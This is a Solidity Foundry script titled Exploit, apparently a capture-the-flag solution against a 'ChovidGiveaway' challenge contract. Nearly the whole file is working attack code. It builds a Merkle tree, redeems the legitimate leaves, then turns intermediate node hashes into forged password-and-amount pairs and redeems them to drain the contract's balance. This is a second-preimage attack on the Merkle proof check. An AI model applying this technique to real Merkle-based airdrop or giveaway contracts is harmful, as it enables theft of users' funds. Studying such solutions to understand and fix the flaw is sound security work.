// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { ChovidGiveaway } from "../src/ChovidGiveaway.sol";
import { Setup } from "../src/Setup.sol";

contract Exploit is Script {
    VmSafe.Wallet public solver;
    Setup public setup;
    ChovidGiveaway public chall;

    function run() public {
        setup = Setup(vm.envAddress("SETUP_CONTRACT"));
        chall = ChovidGiveaway(payable(address(setup.giveaway())));
        solver = vm.createWallet(uint256(vm.envBytes32("PRIVATE_KEY")));
        
        console.log("Solver Addr: ", solver.addr);
        console.log("Chall Addr: ", address(chall));
        console.log("Setup Addr: ", address(setup));
        console.log("solver balance: ", solver.addr.balance);
        console.log("giveaway balance: ", address(chall).balance, "\n");
        vm.startBroadcast(solver.privateKey);

        uint16[] memory amounts;
        bytes[] memory passwords;

        amounts = new uint16[](4);
        amounts[0] = 0x1000;
        amounts[1] = 0x1000;
        amounts[2] = 0x1000;
        amounts[3] = 0x1000;

        passwords = new bytes[](4);
        passwords[0] = "cQKA";
        passwords[1] = "l4A";
        passwords[2] = "loxp";
        passwords[3] = "s9N";
        console.log("=== STAGE 1 ===");
        redeem(passwords, amounts);
        console.log("solver balance: ", solver.addr.balance);
        console.log("giveaway balance: ", address(chall).balance, "\n");

        passwords = new bytes[](4);
        passwords[0] = "bRniE";
        passwords[1] = "vl0";
        passwords[2] = "eKU5w";
        passwords[3] = "yFH";
        console.log("=== STAGE 2 ===");
        redeem(passwords, amounts);
        console.log("solver balance: ", solver.addr.balance);
        console.log("giveaway balance: ", address(chall).balance, "\n");

        passwords = new bytes[](4);
        passwords[0] = "gIt1z";
        passwords[1] = "diS";
        passwords[2] = "doesnotmatter1";
        passwords[3] = "doesnotmatter2";
        console.log("=== STAGE 3 ===");
        redeem(passwords, amounts);
        console.log("solver balance: ", solver.addr.balance);
        console.log("giveaway balance: ", address(chall).balance, "\n");
    }
    
    function redeem(
        bytes[] memory passwords, 
        uint16[] memory amounts
    ) public {
        console.log("== LEAVES == ");
        bytes32[] memory leaves = new bytes32[](4);
        bytes32[] memory tree = new bytes32[](4);
        for(uint256 i = 0; i < 4; i++) {
            bytes memory encoded = abi.encodePacked(
                uint24(passwords[i].length),
                passwords[i],
                amounts[i]
            );
            leaves[i] = keccak256(encoded);
            tree[i] = leaves[i];
            console.logBytes32(leaves[i]);
        }
        console.log("== TREE ==");
        bytes32 root = buildTree(tree);
        chall.createGiveaway{value: 0x1000*4 wei}(passwords, amounts);
        console.log("giveaway balance: ", address(chall).balance);

        console.log("== PROOFS ==");
        bytes32[] memory proof;
        bytes32 leaf;

        proof = new bytes32[](2);
        proof[0] = leaves[0];
        proof[1] = tree[1]; 
        leaf = keccak256(abi.encodePacked(
            uint24(passwords[1].length),
            passwords[1],
            amounts[1]
        ));
        bool ok = verify(proof, root, leaf);
        console.log("ok: ", ok);
        chall.redeem(proof, root, passwords[1], amounts[1]);
        require(chall.redeemedPasswords(leaf), "fail to redeem 1");

        proof = new bytes32[](2);
        proof[0] = leaves[1];
        proof[1] = tree[1]; 
        leaf = keccak256(abi.encodePacked(
            uint24(passwords[0].length),
            passwords[0],
            amounts[0]
        ));
        ok = verify(proof, root, leaf);
        console.log("ok: ", ok);
        chall.redeem(proof, root, passwords[0], amounts[0]);
        require(chall.redeemedPasswords(leaf), "fail to redeem 0");

        proof = new bytes32[](2);
        proof[0] = leaves[2];
        proof[1] = tree[3];
        leaf = keccak256(abi.encodePacked(
            uint24(passwords[3].length),
            passwords[3],
            amounts[3]
        ));
        ok = verify(proof, root, leaf);
        console.log("ok: ", ok);
        chall.redeem(proof, root, passwords[3], amounts[3]);
        require(chall.redeemedPasswords(leaf), "fail to redeem 3");

        proof = new bytes32[](2);
        proof[0] = leaves[3];
        proof[1] = tree[3]; 
        leaf = keccak256(abi.encodePacked(
            uint24(passwords[2].length),
            passwords[2],
            amounts[2]
        ));
        ok = verify(proof, root, leaf);
        console.log("ok: ", ok);
        chall.redeem(proof, root, passwords[2], amounts[2]);
        require(chall.redeemedPasswords(leaf), "fail to redeem 2");

        console.log("== REDEEMING INTERMEDIARY LEAVES ==");
        bytes memory malicious_password;
        uint16 amount;

        proof = new bytes32[](1);
        proof[0] = tree[1];
        (malicious_password, amount) = decodeHashToCredentials(commutativeconcatHash(leaves[0], leaves[1]));
        // leaf = keccak256(abi.encodePacked(
        //     uint24(malicious_password.length),
        //     malicious_password,
        //     amount
        // ));
        // ok = verify(proof, root, leaf);
        // console.log("ok: ", ok);
        chall.redeem(proof, root, fixPassword(malicious_password), amount);
        
        if(address(chall).balance == 0) return;

        proof = new bytes32[](1);
        proof[0] = tree[3];
        (malicious_password, amount) = decodeHashToCredentials(commutativeconcatHash(leaves[2], leaves[3]));
        // leaf = keccak256(abi.encodePacked(
        //     uint24(malicious_password.length),
        //     malicious_password,
        //     amount
        // ));
        // ok = verify(proof, root, leaf);
        // console.log("ok: ", ok);
        chall.redeem(proof, root, fixPassword(malicious_password), amount);

        vm.stopBroadcast();
    }

    function fixPassword(bytes memory password) internal pure returns (bytes memory) {
        // tf?
        // > Since malicious_password is manually reconstructed from a bytes hash
        // > This memory allocation may leave uninitialized or padded data that breaks ABI encoding when passed to an external call like chall.redeem(...).
        bytes memory fixedPassword = new bytes(0x3b);
        for (uint256 i = 0; i < 0x3b; i++) {
            fixedPassword[i] = password[i];
        }
        return fixedPassword;
    }

    function decodeHashToCredentials(bytes memory hash) internal pure returns (bytes memory password, uint16 amount) {
            password = new bytes(0x3b);
            for (uint256 i = 0; i < 0x3b; i++) {
                password[i] = hash[i+3];
            }

            assembly {
                mstore(0x40, hash)
                amount := mload(32)
            }
    }

    function commutativeconcatHash(bytes32 a, bytes32 b) internal pure returns (bytes memory) {
        return a < b ? concatHash(a, b) : concatHash(b, a);
    }

    function concatHash(bytes32 a, bytes32 b) internal pure returns (bytes memory) {
        assembly {
            mstore(0x00, a)
            mstore(0x20, b)
        }

        bytes memory toHash = new bytes(64);
        assembly {
            mstore(add(toHash, 32), mload(0x00)) // first 32 bytes
            mstore(add(toHash, 64), mload(0x20)) // second 32 bytes
        }
        return toHash;
    }

    function commutativeKeccak256(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? efficientKeccak256(a, b) : efficientKeccak256(b, a);
    }

    function efficientKeccak256(bytes32 a, bytes32 b) internal pure returns (bytes32 value) {
        assembly ("memory-safe") {
            mstore(0x00, a)
            mstore(0x20, b)
            value := keccak256(0x00, 0x40)
        }
    }

    function buildTree(bytes32[] memory _leaves) internal pure returns (bytes32) {
        bytes32[] memory leaves = _leaves;
        if (leaves.length == 0) return bytes32(0);
        if (leaves.length == 1) return leaves[0];

        uint256 n = leaves.length;
        
        while (n > 1) {
            if (n % 2 == 1) revert InvalidGiveawayLength();
            
            for (uint256 i = 0; i < n/2; i++) {
                bytes32 left = leaves[2*i];
                bytes32 right = leaves[2*i + 1];
                bytes32 parent = commutativeKeccak256(left, right);
                console.logBytes32(parent);

                // just saving the child leaves that gets overwritten by root
                // ungly but it gets the job done 
                if (i == uint256(0)) {
                    if (n <= 2) {
                        leaves[3] = leaves[0];
                    }
                }
                leaves[i] = parent;  // Write back to the same array

            }
            
            if (n % 2 == 1) {
                leaves[n/2] = leaves[n - 1];
            }
            
            n = (n + 1) / 2;
        }

        return leaves[0];
    }

    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        return processProof(proof, leaf) == root;
    }

    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            computedHash = commutativeKeccak256(computedHash, proof[i]);
        }
        return computedHash;
    }

    error InvalidPasswordLength();
    error InvalidGiveawayLength();
    error InvalidGiveawayValue();
    error AlreadyRedeemed();
    error InvalidProof();
    error InvalidValue();
    error InvalidRoot();
    error MerkleProofInvalidMultiproof();
}
